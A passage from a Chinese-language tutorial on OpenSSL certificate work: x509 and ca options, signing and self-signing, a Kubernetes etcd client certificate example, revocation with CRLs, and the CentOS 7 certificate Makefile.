<span style="color: #b22222;"># </span><span style="color: #b22222;">-cert file     &#65306;CA&#33258;&#24049;&#30340;&#35777;&#20070;&#25991;&#20214;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-keyfile arg   &#65306;&#25351;&#23450;&#31614;&#32626;&#35777;&#20070;&#35831;&#27714;&#26102;&#30340;&#31169;&#38053;&#25991;&#20214;&#65292;&#21363;CA&#33258;&#24049;&#30340;&#31169;&#38053;&#25991;&#20214;&#12290;</span>
}

openssl ca -batch -config  /etc/pki/tls/openssl.cnf <span style="color: #8b2252;">\</span>
        -days 36500 -notext <span style="color: #8b2252;">\</span>
        -md sha256 -in server.csr -out server.crt <span style="color: #8b2252;">\</span>
        -cert ca.crt -keyfile ca.key
</pre>
</div>
</div>
</div>
<div id="outline-container-h:84fb81f5-8a5b-4f6b-a011-ddfb7580986e" class="outline-5">
<h5 id="h:84fb81f5-8a5b-4f6b-a011-ddfb7580986e">openssl x509(签署和自签署)</h5>
<div class="outline-text-5" id="text-h:84fb81f5-8a5b-4f6b-a011-ddfb7580986e">
<p>
主要用于输出证书信息，也能够签署证书请求文件、自签署、转换证书格式等
</p>

<p>
openssl x509工具 <b>不会使用openssl配置文件中的设定，而是完全需要自行设
定或者使用该伪命令的默认值，它就像是一个完整的小型的CA工具箱</b> 。
</p>

<p>
选项非常多，所以分段解释。
</p>

<div class="org-src-container">
<pre class="src src-sh">&#12304;&#36755;&#20837;&#36755;&#20986;&#36873;&#39033;&#65306;&#12305;
-in filename  &#65306;&#25351;&#23450;&#35777;&#20070;&#36755;&#20837;&#25991;&#20214;&#65292;&#33509;&#21516;&#26102;&#25351;&#23450;&#20102;<span style="color: #8b2252;">"-req"</span>&#36873;&#39033;&#65292;&#21017;&#34920;&#31034;&#36755;&#20837;&#25991;&#20214;&#20026;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#12290;
-out filename &#65306;&#25351;&#23450;&#36755;&#20986;&#25991;&#20214;
-md2|-md5|-sha1|-mdc2&#65306;&#25351;&#23450;&#21333;&#21521;&#21152;&#23494;&#30340;&#31639;&#27861;&#12290;

&#12304;&#20449;&#24687;&#36755;&#20986;&#36873;&#39033;&#65306;&#12305;
-text&#65306;&#20197;text&#26684;&#24335;&#36755;&#20986;&#35777;&#20070;&#20869;&#23481;&#65292;&#21363;&#20197;&#26368;&#20840;&#26684;&#24335;&#36755;&#20986;&#65292;
     &#65306;&#21253;&#25324;public key,signature algorithms,issuer&#21644;subject names,serial number&#20197;&#21450;any trust settings.
-certopt option&#65306;&#33258;&#23450;&#20041;&#35201;&#36755;&#20986;&#30340;&#39033;
-noout         &#65306;&#31105;&#27490;&#36755;&#20986;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#20013;&#30340;&#32534;&#30721;&#37096;&#20998;
-pubkey        &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;&#30340;&#20844;&#38053;
-modulus       &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;&#20844;&#38053;&#27169;&#22359;&#37096;&#20998;
-serial        &#65306;&#36755;&#20986;&#35777;&#20070;&#30340;&#24207;&#21015;&#21495;
-subject       &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;&#30340;subject
-issuer        &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;&#30340;issuer&#65292;&#21363;&#39041;&#21457;&#32773;&#30340;subject
-subject_hash  &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;subject&#30340;hash&#30721;
-issuer_hash   &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;issuer(&#21363;&#39041;&#21457;&#32773;&#30340;subject)&#30340;hash&#30721;
-hash          &#65306;&#31561;&#20215;&#20110;<span style="color: #8b2252;">"-subject_hash"</span>&#65292;&#20294;&#27492;&#39033;&#26159;&#20026;&#20102;&#21521;&#21518;&#20860;&#23481;&#25165;&#25552;&#20379;&#30340;&#36873;&#39033;
-email         &#65306;&#36755;&#20986;&#35777;&#20070;&#20013;&#30340;email&#22320;&#22336;&#65292;&#22914;&#26524;&#26377;email&#30340;&#35805;
-startdate     &#65306;&#36755;&#20986;&#35777;&#20070;&#26377;&#25928;&#26399;&#30340;&#36215;&#22987;&#26085;&#26399;
-enddate       &#65306;&#36755;&#20986;&#35777;&#20070;&#26377;&#25928;&#26399;&#30340;&#32456;&#27490;&#26085;&#26399;
-dates         &#65306;&#36755;&#20986;&#35777;&#20070;&#26377;&#25928;&#26399;&#65292;&#31561;&#20215;&#20110;<span style="color: #8b2252;">"startdate+enddate"</span>
-fingerprint   &#65306;&#36755;&#20986;&#25351;&#32441;&#25688;&#35201;&#20449;&#24687;
&#36755;&#20986;&#35777;&#20070;&#26576;&#20123;&#20449;&#24687;&#30340;&#26102;&#20505;&#65292;&#21487;&#20197;&#37197;&#21512;<span style="color: #8b2252;">"-noout"</span>&#36873;&#39033;&#65292;&#28982;&#21518;&#20877;&#25351;&#23450;&#26576;&#20123;&#39033;&#26469;&#20351;&#29992;&#12290;&#20363;&#22914;&#65306;
openssl x509 -in cert.pem -noout -text
openssl x509 -in cert.pem -noout -startdate -enddate

&#12304;&#31614;&#32626;&#36873;&#39033;&#65306;&#12305;
*****************************************************************************************
*  &#20266;&#21629;&#20196;x509&#21487;&#20197;&#20687;openssl ca&#19968;&#26679;&#23545;&#35777;&#20070;&#25110;&#35831;&#27714;&#25191;&#34892;&#31614;&#21517;&#21160;&#20316;&#12290;&#27880;&#24847;&#65292;openssl x509         *
*  &#19981;&#35835;&#21462;&#37197;&#32622;&#25991;&#20214;&#65292;&#25152;&#26377;&#30340;&#19968;&#20999;&#37197;&#32622;&#37117;&#30001;x509&#33258;&#34892;&#25552;&#20379;&#65292;&#25152;&#20197;openssl x509&#20687;&#26159;&#19968;&#20010;<span style="color: #8b2252;">"mini CA"</span>  *
*****************************************************************************************
-signkey filename&#65306;&#35813;&#36873;&#39033;&#29992;&#20110;&#25552;&#20379;&#33258;&#31614;&#32626;&#26102;&#30340;&#31169;&#38053;&#25991;&#20214;&#65292;&#33258;&#31614;&#32626;&#30340;&#36755;&#20837;&#25991;&#20214;<span style="color: #8b2252;">"-in file"</span>&#30340;file&#21487;&#20197;&#26159;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#65292;&#20063;&#21487;&#20197;&#26159;&#24050;&#31614;&#32626;&#36807;&#30340;&#35777;&#20070;&#12290;-days arg&#65306;&#25351;&#23450;&#35777;&#20070;&#26377;&#25928;&#26399;&#38480;&#65292;&#40664;&#35748;30&#22825;&#12290;
-x509toreq&#65306;&#23558;&#24050;&#31614;&#32626;&#30340;&#35777;&#20070;&#36716;&#25442;&#22238;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#12290;&#38656;&#35201;&#20351;&#29992;<span style="color: #8b2252;">"-signkey"</span>&#36873;&#39033;&#26469;&#20256;&#36882;&#38656;&#35201;&#30340;&#31169;&#38053;&#12290;
-req&#65306;x509&#24037;&#20855;&#40664;&#35748;&#20197;&#35777;&#20070;&#25991;&#20214;&#20570;&#20026;inputfile(-in file)&#65292;&#25351;&#23450;&#35813;&#36873;&#39033;&#23558;&#20351;&#24471;input file&#30340;file&#20026;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#12290;
-set_serial n&#65306;&#25351;&#23450;&#35777;&#20070;&#24207;&#21015;&#21495;&#12290;&#35813;&#36873;&#39033;&#21487;&#20197;&#21644;<span style="color: #8b2252;">"-singkey"</span>&#25110;<span style="color: #8b2252;">"-CA"</span>&#36873;&#39033;&#19968;&#36215;&#20351;&#29992;&#12290;
             &#65306;&#22914;&#26524;&#21644;<span style="color: #8b2252;">"-CA"</span>&#19968;&#36215;&#20351;&#29992;&#65292;&#21017;<span style="color: #8b2252;">"-CAserial"</span>&#25110;<span style="color: #8b2252;">"-CAcreateserial"</span>&#36873;&#39033;&#25351;&#23450;&#30340;serial&#20540;&#23558;&#22833;&#25928;&#12290;
             &#65306;&#24207;&#21015;&#21495;&#21487;&#20197;&#20351;&#29992;&#25968;&#20540;&#25110;16&#36827;&#21046;&#20540;(0x&#24320;&#22836;)&#12290;&#20063;&#25509;&#21463;&#36127;&#20540;&#65292;&#20294;&#26159;&#19981;&#24314;&#35758;&#12290;
-CA filename      &#65306;&#25351;&#23450;&#31614;&#32626;&#26102;&#25152;&#20351;&#29992;&#30340;CA&#35777;&#20070;&#12290;&#35813;&#36873;&#39033;&#19968;&#33324;&#21644;<span style="color: #8b2252;">"-req"</span>&#36873;&#39033;&#19968;&#36215;&#20351;&#29992;&#65292;&#29992;&#20110;&#20026;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#31614;&#32626;&#12290;
-CAkey filename   &#65306;&#35774;&#32622;CA&#31614;&#32626;&#26102;&#20351;&#29992;&#30340;&#31169;&#38053;&#25991;&#20214;&#12290;&#22914;&#26524;&#35813;&#36873;&#39033;&#27809;&#26377;&#25351;&#23450;&#65292;&#23558;&#20551;&#23450;CA&#31169;&#38053;&#24050;&#32463;&#23384;&#22312;&#20110;CA&#33258;&#31614;&#21517;&#30340;&#35777;&#20070;&#25991;&#20214;&#20013;&#12290;
-CAserial filename&#65306;&#35774;&#32622;CA&#20351;&#29992;&#30340;&#24207;&#21015;&#21495;&#25991;&#20214;&#12290;&#24403;&#20351;&#29992;<span style="color: #8b2252;">"-CA"</span>&#36873;&#39033;&#26469;&#31614;&#21517;&#26102;&#65292;&#23427;&#23558;&#20250;&#20351;&#29992;&#26576;&#20010;&#25991;&#20214;&#20013;&#25351;&#23450;&#30340;&#24207;&#21015;&#21495;&#26469;&#21807;&#19968;&#26631;&#35782;&#27492;&#27425;&#31614;&#21517;&#21518;&#30340;&#35777;&#20070;&#25991;&#20214;&#12290;
                  &#65306;&#36825;&#20010;&#24207;&#21015;&#21495;&#25991;&#20214;&#30340;&#20869;&#23481;&#20165;&#21482;&#26377;&#19968;&#34892;&#65292;&#36825;&#19968;&#34892;&#30340;&#20540;&#20026;16&#36827;&#21046;&#30340;&#25968;&#23383;&#12290;&#24403;&#26576;&#20010;&#24207;&#21015;&#21495;&#34987;&#20351;&#29992;&#21518;&#65292;&#35813;&#25991;&#20214;&#20013;&#30340;&#24207;&#21015;&#21495;&#23558;&#33258;&#21160;&#22686;&#21152;&#12290;
                  &#65306;&#40664;&#35748;&#24207;&#21015;&#21495;&#25991;&#20214;&#20197;CA&#35777;&#20070;&#25991;&#20214;&#22522;&#21517;&#21152;<span style="color: #8b2252;">".srl"</span>&#20026;&#21518;&#32512;&#21629;&#21517;&#12290;&#22914;CA&#35777;&#20070;&#20026;<span style="color: #8b2252;">"mycert.pem"</span>&#65292;&#21017;&#40664;&#35748;&#23547;&#25214;&#30340;&#24207;&#21015;&#21495;&#25991;&#20214;&#20026;<span style="color: #8b2252;">"mycert.srl"</span>
-CAcreateserial   &#65306;&#24403;&#20351;&#29992;&#35813;&#36873;&#39033;&#26102;&#65292;&#22914;&#26524;CA&#20351;&#29992;&#30340;&#24207;&#21015;&#21495;&#25991;&#20214;&#19981;&#23384;&#22312;&#23558;&#33258;&#21160;&#21019;&#24314;&#65306;&#35813;&#25991;&#20214;&#23558;&#21253;&#21547;&#24207;&#21015;&#21495;&#20540;<span style="color: #8b2252;">"02"</span>&#24182;&#19988;&#27492;&#27425;&#31614;&#21517;&#21518;&#35777;&#20070;&#25991;&#20214;&#24207;&#21015;&#21495;&#20026;1&#12290;
                  &#65306;&#19968;&#33324;&#22914;&#26524;&#20351;&#29992;&#20102;<span style="color: #8b2252;">"-CA"</span>&#36873;&#39033;&#32780;&#24207;&#21015;&#21495;&#25991;&#20214;&#19981;&#23384;&#22312;&#23558;&#20250;&#20135;&#29983;&#38169;&#35823;<span style="color: #8b2252;">"&#25214;&#19981;&#21040;srl&#25991;&#20214;"</span>&#12290;
-extfile filename &#65306;&#25351;&#23450;&#31614;&#21517;&#26102;&#21253;&#21547;&#35201;&#28155;&#21152;&#21040;&#35777;&#20070;&#20013;&#30340;&#25193;&#23637;&#39033;&#30340;&#25991;&#20214;&#12290;

&#12304;CERTIFICATE EXTENSIONS&#12305;
-purpose&#65306;&#36873;&#39033;&#26816;&#26597;&#35777;&#20070;&#30340;&#25193;&#23637;&#39033;&#24182;&#20915;&#23450;&#35813;&#35777;&#20070;&#20801;&#35768;&#29992;&#20110;&#21738;&#20123;&#26041;&#38754;&#65292;&#21363;&#35777;&#20070;&#20351;&#29992;&#30446;&#30340;&#33539;&#22260;&#12290;
basicConstraints&#65306;&#35813;&#25193;&#23637;&#39033;&#29992;&#20110;&#20915;&#23450;&#35777;&#20070;&#26159;&#21542;&#21487;&#20197;&#24403;&#20316;CA&#35777;&#20070;&#12290;<span style="color: #a0522d;">&#26684;&#24335;&#20026;basicConstraints</span>=CA:true | false
                &#65306;1.&#22914;&#26524;CA&#30340;flag&#35774;&#32622;&#20026;true&#65292;&#37027;&#20040;&#35813;&#35777;&#20070;&#20801;&#35768;&#20316;&#20026;&#19968;&#20010;CA&#35777;&#20070;&#65292;&#21363;&#21487;&#20197;&#39041;&#21457;&#19979;&#32423;&#35777;&#20070;&#25110;&#36827;&#34892;&#31614;&#21517;&#65307;
                &#65306;2.&#22914;&#26524;CA&#30340;flag&#35774;&#32622;&#20026;false&#65292;&#37027;&#20040;&#35813;&#35777;&#20070;&#23601;&#19981;&#33021;&#20316;&#20026;CA&#65292;&#19981;&#33021;&#20026;&#19979;&#32423;&#39041;&#21457;&#35777;&#20070;&#25110;&#31614;&#21517;&#65307;
                &#65306;3.&#25152;&#26377;CA&#30340;&#35777;&#20070;&#20013;&#37117;&#24517;&#39035;&#35774;&#32622;CA&#30340;flag&#20026;true&#12290;
                &#65306;4.&#22914;&#26524;basicConstraints&#25193;&#23637;&#39033;&#26410;&#35774;&#32622;&#65292;&#37027;&#20040;&#35777;&#20070;&#34987;&#35748;&#20026;&#21487;&#30097;&#30340;CA&#65292;&#21363;<span style="color: #8b2252;">"possible CA"</span>&#12290;
keyUsage&#65306;&#35813;&#25193;&#23637;&#39033;&#29992;&#20110;&#25351;&#23450;&#35777;&#20070;&#39069;&#22806;&#30340;&#20351;&#29992;&#38480;&#21046;&#65292;&#21363;&#20063;&#26159;&#20351;&#29992;&#30446;&#30340;&#30340;&#19968;&#31181;&#34920;&#29616;&#26041;&#24335;&#12290;
        &#65306;1.&#22914;&#26524;keyUsage&#25193;&#23637;&#39033;&#34987;&#25351;&#23450;&#65292;&#37027;&#20040;&#35813;&#35777;&#20070;&#23558;&#21448;&#26377;&#39069;&#22806;&#30340;&#20351;&#29992;&#38480;&#21046;&#12290;
        &#65306;2.CA<span style="color: #a0522d;">&#35777;&#20070;&#25991;&#20214;&#20013;&#24517;&#39035;&#33267;&#23569;&#35774;&#32622;keyUsage</span>=keyCertSign&#12290;
        &#65306;3.&#22914;&#26524;&#35774;&#32622;&#20102;keyUsage&#25193;&#23637;&#39033;&#65292;&#37027;&#20040;&#19981;&#35770;&#26159;&#21542;&#20351;&#29992;&#20102;critical&#65292;&#37117;&#23558;&#34987;&#38480;&#21046;&#22312;&#25351;&#23450;&#30340;&#20351;&#29992;&#30446;&#30340;purpose&#19978;&#12290;
</pre>
</div>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;x509&#24037;&#20855;&#33258;&#24314;CA&#12290;&#30001;&#20110;x509&#26080;&#27861;&#24314;&#31435;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#65292;&#25152;&#20197;&#21482;&#33021;&#20351;&#29992;openssl req&#26469;&#29983;&#25104;&#35831;&#27714;&#25991;&#20214;&#65292;&#28982;&#21518;&#20351;&#29992;x509&#26469;&#33258;&#31614;&#32626;&#12290;</span>
openssl req -new -keyout key.pem -out req.csr
openssl x509 -req -in req.csr -signkey key.pem -out x509.crt

<span style="color: #b22222;">#</span><span style="color: #b22222;">x509&#20063;&#21487;&#20197;&#29992;&#26469;&#31614;&#32626;&#20182;&#20154;&#30340;&#35777;&#20070;&#35831;&#27714;&#65292;&#21363;&#20026;&#20182;&#20154;&#39041;&#21457;&#35777;&#20070;&#12290;&#27880;&#24847;&#65292;&#20026;&#20182;&#20154;&#39041;&#21457;&#35777;&#20070;&#26102;&#65292;&#30830;&#20445;serial&#25991;&#20214;&#23384;&#22312;&#65292;&#24314;&#35758;&#20351;&#29992;&#33258;&#21160;&#21019;&#24314;&#30340;&#36873;&#39033;"-CAcreateserial"&#12290;</span>
openssl x509 -req -in req.csr -CA ca.crt -CAkey ca.key -out x509.crt -CAcreateserial <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#36825;&#20010;&#21487;&#20197;&#36991;&#20813;&#19968;&#20123;&#38169;&#35823;</span>
</pre>
</div>

<p>
范例: k8s签署证书
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">setp1 &#31614;&#21457;&#35831;&#27714;</span>
openssl req -nodes -sha256  -newkey rsa:4096 -keyout apiserver-etcd-client.key  -out apiserver-etcd-client.csr -subj <span style="color: #8b2252;">"/CN=apiserver-etcd-client/O=system:masters"</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">setp2 ca&#31614;&#21457;&#26041;&#24335;1</span>
openssl x509 -days 36500 -req -in apiserver-etcd-client.csr -CA etcd/ca.crt -CAkey etcd/ca.key -CAcreateserial -extensions v3_req_etcd -extfile openssl.cnf -out apiserver-etcd-client.crt
<span style="color: #b22222;"># </span><span style="color: #b22222;">setp2 ca&#31614;&#21457;&#26041;&#24335;2(&#19981;&#25512;&#33616;&#65292;&#35201;&#27714;&#26377;&#35777;&#20070;&#31614;&#21457;&#37197;&#32622;ca&#65292;&#21487;&#20197;&#27809;&#26377;&#35777;&#20070;&#35831;&#27714;&#37197;&#32622;req)</span>
<span style="color: #483d8b;">source</span> ~/env.sh 
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">CERT_DIR</span>=etcd
touch $<span style="color: #a0522d;">CERT_DIR</span>/index.txt
<span style="color: #483d8b;">echo</span> 1000 &gt; $<span style="color: #a0522d;">CERT_DIR</span>/serial
touch $<span style="color: #a0522d;">CERT_DIR</span>/index.txt.attr
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"unique_subject = no"</span> &gt; $<span style="color: #a0522d;">CERT_DIR</span>/index.txt.attr

openssl ca -batch -days 36500 -notext <span style="color: #8b2252;">\</span>
    -config &lt;(cat openssl.cnf &lt;(<span style="color: #483d8b;">printf</span> <span style="color: #8b2252;">'[ ca ]\ndefault_ca = CA_default\n[ CA_default ]\ndir=${ENV::CERT_DIR}\ncerts = $dir\nnew_certs_dir =$dir\ndatabase = $dir/index.txt\nunique_subject = no\nserial = $dir/serial\npolicy = policy_loose\n[ policy_loose ]\n'</span>)) <span style="color: #8b2252;">\</span>
    -extensions v3_req_etcd  -notext -cert etcd/ca.crt -keyfile etcd/ca.key -md sha256 -in apiserver-etcd-client.csr -out apiserver-etcd-client.crt 
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28165;&#29702;   </span>
rm -f $<span style="color: #a0522d;">CERT_DIR</span>/index*
rm -f $<span style="color: #a0522d;">CERT_DIR</span>/100*
rm -f $<span style="color: #a0522d;">CERT_DIR</span>/serial*
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:8f2a9e0a-b099-4982-ae13-5b37252a0563" class="outline-4">
<h4 id="h:8f2a9e0a-b099-4982-ae13-5b37252a0563">吊销证书</h4>
<div class="outline-text-4" id="text-h:8f2a9e0a-b099-4982-ae13-5b37252a0563">
<p>
在客户端获取要吊销的证书的serial
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl x509 -in /PATH/FROM/CERT_FILE -noout -serial -subject
</pre>
</div>

<p>
在CA上，根据客户提交的serial与subject信息，对比检验是否与index.txt文件
中的信息一致，吊销证书：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl ca -revoke /etc/pki/CA/newcerts/SERIAL.pem
</pre>
</div>

<p>
指定第一个吊销证书的编号,注意：第一次更新证书吊销列表前，才需要执行
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">echo</span> 01 &gt; /etc/pki/CA/crlnumber
</pre>
</div>

<p>
更新证书吊销列表
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl ca -gencrl -out /etc/pki/CA/crl.pem
</pre>
</div>

<p>
查看crl文件：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl crl -in /etc/pki/CA/crl.pem -noout -text
</pre>
</div>

<p>
我的做法 除了做了上面的还是不行，所幸就删了
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt; /etc/pki/CA/index.txt
rm -f   /etc/pki/CA/crlnumber.old
</pre>
</div>
</div>
</div>
<div id="outline-container-h:796dbef0-8db6-46e4-80e9-9b1b54c03d7c" class="outline-4">
<h4 id="h:796dbef0-8db6-46e4-80e9-9b1b54c03d7c">CentOS 7 创建自签名证书</h4>
<div class="outline-text-4" id="text-h:796dbef0-8db6-46e4-80e9-9b1b54c03d7c">
<p>
/etc/pki/tls/certs 有makefile文件
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@Centos7 ~]#cd /etc/pki/tls/certs
[root@Centos7 certs]#make
This makefile allows you to create:
  o public/private key pairs <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#20844;&#38053;&#31169;&#38053;&#23545;</span>
  o SSL certificate signing requests (CSRs) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;csr&#25991;&#20214;</span>
  o self-signed SSL test certificates <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33258;&#31614;&#21517;&#35777;&#20070;</span>

To create a key pair, run <span style="color: #8b2252;">"make SOMETHING.key"</span>.
To create a CSR, run <span style="color: #8b2252;">"make SOMETHING.csr"</span>.
To create a test certificate, run <span style="color: #8b2252;">"make SOMETHING.crt"</span>.
To create a key and a test certificate<span style="color: #a020f0;"> in</span> one file, run <span style="color: #8b2252;">"make SOMETHING.pem"</span>. <span style="color: #b22222;"># </span><span style="color: #b22222;">&#31169;&#38053;&#21644;&#35777;&#20070;&#21512;&#24182;&#20026;&#19968;&#20010;&#25991;&#20214;</span>

To create a key for use with Apache, run <span style="color: #8b2252;">"make genkey"</span>.
To create a CSR for use with Apache, run <span style="color: #8b2252;">"make certreq"</span>.
To create a test certificate for use with Apache, run <span style="color: #8b2252;">"make testcert"</span>.

To create a test certificate with serial number other than random, add <span style="color: #a0522d;">SERIAL</span>=num
You can also specify key length with <span style="color: #a0522d;">KEYLEN</span>=n and expiration<span style="color: #a020f0;"> in</span> days with <span style="color: #a0522d;">DAYS</span>=n
Any additional options can be passed to openssl req via EXTRA_FLAGS

Examples:
  make server.key
  make server.csr
  make server.crt
  make stunnel.pem
  make genkey
  make certreq
  make testcert
  make server.crt <span style="color: #a0522d;">SERIAL</span>=1
  make stunnel.pem <span style="color: #a0522d;">EXTRA_FLAGS</span>=-sha384
  make testcert <span style="color: #a0522d;">DAYS</span>=600
[root@Centos7 certs]#ls
ca-bundle.crt        make-dummy-cert  renew-dummy-cert

ca-bundle.trust.crt  Makefile
[root@Centos7 certs]#cat Makefile 
UTF8 := $(<span style="color: #ff00ff;">shell locale -c LC_CTYPE -k | grep -q charmap.*UTF-8 &amp;&amp; echo -utf8</span>)
<span style="color: #a0522d;">DAYS</span>=365
<span style="color: #a0522d;">KEYLEN</span>=2048
<span style="color: #a0522d;">TYPE</span>=rsa:$(<span style="color: #ff00ff;">KEYLEN</span>)
<span style="color: #a0522d;">EXTRA_FLAGS</span>=
ifdef SERIAL
    <span style="color: #a0522d;">EXTRA_FLAGS</span>+=-set_serial $(<span style="color: #ff00ff;">SERIAL</span>)
endif

.PHONY: usage
.SUFFIXES: .key .csr .crt .pem
.PRECIOUS: %.key %.csr %.crt %.pem

usage:
    @echo <span style="color: #8b2252;">"This makefile allows you to create:"</span>
    @echo <span style="color: #8b2252;">"  o public/private key pairs"</span>
    @echo <span style="color: #8b2252;">"  o SSL certificate signing requests (CSRs)"</span>
    @echo <span style="color: #8b2252;">"  o self-signed SSL test certificates"</span>
    @echo
    @echo <span style="color: #8b2252;">"To create a key pair, run \"make SOMETHING.key\"."</span>
    @echo <span style="color: #8b2252;">"To create a CSR, run \"make SOMETHING.csr\"."</span>
    @echo <span style="color: #8b2252;">"To create a test certificate, run \"make SOMETHING.crt\"."</span>
    @echo <span style="color: #8b2252;">"To create a key and a test certificate in one file, run \"make SOMETHING.pem\"."</span>
    @echo
    @echo <span style="color: #8b2252;">"To create a key for use with Apache, run \"make genkey\"."</span>
    @echo <span style="color: #8b2252;">"To create a CSR for use with Apache, run \"make certreq\"."</span>
    @echo <span style="color: #8b2252;">"To create a test certificate for use with Apache, run \"make testcert\"."</span>
    @echo
    @echo <span style="color: #8b2252;">"To create a test certificate with serial number other than random, add SERIAL=num"</span>
    @echo <span style="color: #8b2252;">"You can also specify key length with KEYLEN=n and expiration in days with DAYS=n"</span>
    @echo <span style="color: #8b2252;">"Any additional options can be passed to openssl req via EXTRA_FLAGS"</span>
    @echo
    @echo Examples:
    @echo <span style="color: #8b2252;">"  make server.key"</span>
    @echo <span style="color: #8b2252;">"  make server.csr"</span>
    @echo <span style="color: #8b2252;">"  make server.crt"</span>
    @echo <span style="color: #8b2252;">"  make stunnel.pem"</span>
    @echo <span style="color: #8b2252;">"  make genkey"</span>
    @echo <span style="color: #8b2252;">"  make certreq"</span>
    @echo <span style="color: #8b2252;">"  make testcert"</span>
    @echo <span style="color: #8b2252;">"  make server.crt SERIAL=1"</span>
    @echo <span style="color: #8b2252;">"  make stunnel.pem EXTRA_FLAGS=-sha384"</span>
    @echo <span style="color: #8b2252;">"  make testcert DAYS=600"</span>

%.pem:
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    <span style="color: #a0522d;">PEM1</span>=<span style="color: #ff00ff;">`/bin/mktemp /tmp/openssl.XXXXXX`</span> ; <span style="color: #8b2252;">\</span>
    <span style="color: #a0522d;">PEM2</span>=<span style="color: #ff00ff;">`/bin/mktemp /tmp/openssl.XXXXXX`</span> ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl req $(<span style="color: #ff00ff;">UTF8</span>) -newkey $(<span style="color: #ff00ff;">TYPE</span>) -keyout $<span style="color: #a0522d;">$PEM1</span> -nodes -x509 -days $(<span style="color: #ff00ff;">DAYS</span>) -out $<span style="color: #a0522d;">$PEM2</span> $(<span style="color: #ff00ff;">EXTRA_FLAGS</span>) ; <span style="color: #8b2252;">\</span>
    cat $<span style="color: #a0522d;">$PEM1</span> &gt;  $<span style="color: #a0522d;">@</span> ; <span style="color: #8b2252;">\</span>
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">""</span>    &gt;&gt; $<span style="color: #a0522d;">@</span> ; <span style="color: #8b2252;">\</span>
    cat $<span style="color: #a0522d;">$PEM2</span> &gt;&gt; $<span style="color: #a0522d;">@</span> ; <span style="color: #8b2252;">\</span>
    $(<span style="color: #ff00ff;">RM</span>) $<span style="color: #a0522d;">$PEM1</span> $<span style="color: #a0522d;">$PEM2</span>

%.key:
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl genrsa -aes128 $(<span style="color: #ff00ff;">KEYLEN</span>) &gt; $<span style="color: #a0522d;">@</span>

%.csr: %.key
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl req $(<span style="color: #ff00ff;">UTF8</span>) -new -key $^ -out $<span style="color: #a0522d;">@</span>

%.crt: %.key
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl req $(<span style="color: #ff00ff;">UTF8</span>) -new -key $^ -x509 -days $(<span style="color: #ff00ff;">DAYS</span>) -out $<span style="color: #a0522d;">@</span> $(<span style="color: #ff00ff;">EXTRA_FLAGS</span>)

<span style="color: #a0522d;">TLSROOT</span>=/etc/pki/tls
<span style="color: #a0522d;">KEY</span>=$(<span style="color: #ff00ff;">TLSROOT</span>)/private/localhost.key
<span style="color: #a0522d;">CSR</span>=$(<span style="color: #ff00ff;">TLSROOT</span>)/certs/localhost.csr
<span style="color: #a0522d;">CRT</span>=$(<span style="color: #ff00ff;">TLSROOT</span>)/certs/localhost.crt

genkey: $(<span style="color: #ff00ff;">KEY</span>)
certreq: $(<span style="color: #ff00ff;">CSR</span>)
testcert: $(<span style="color: #ff00ff;">CRT</span>)

$(<span style="color: #ff00ff;">CSR</span>): $(<span style="color: #ff00ff;">KEY</span>)
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl req $(<span style="color: #ff00ff;">UTF8</span>) -new -key $(<span style="color: #ff00ff;">KEY</span>) -out $(<span style="color: #ff00ff;">CSR</span>)

$(<span style="color: #ff00ff;">CRT</span>): $(<span style="color: #ff00ff;">KEY</span>)
    <span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
    /usr/bin/openssl req $(<span style="color: #ff00ff;">UTF8</span>) -new -key $(<span style="color: #ff00ff;">KEY</span>) -x509 -days $(<span style="color: #ff00ff;">DAYS</span>) -out $(<span style="color: #ff00ff;">CRT</span>) $(<span style="color: #ff00ff;">EXTRA_FLAGS</span>)

[root@Centos7 certs]#make app.crt
<span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
/usr/bin/openssl genrsa -aes128 2048 &gt; app.key
Generating RSA private key, 2048 bit long modulus
....................................+++
............................................+++
e is 65537 (0x10001)
Enter pass phrase:
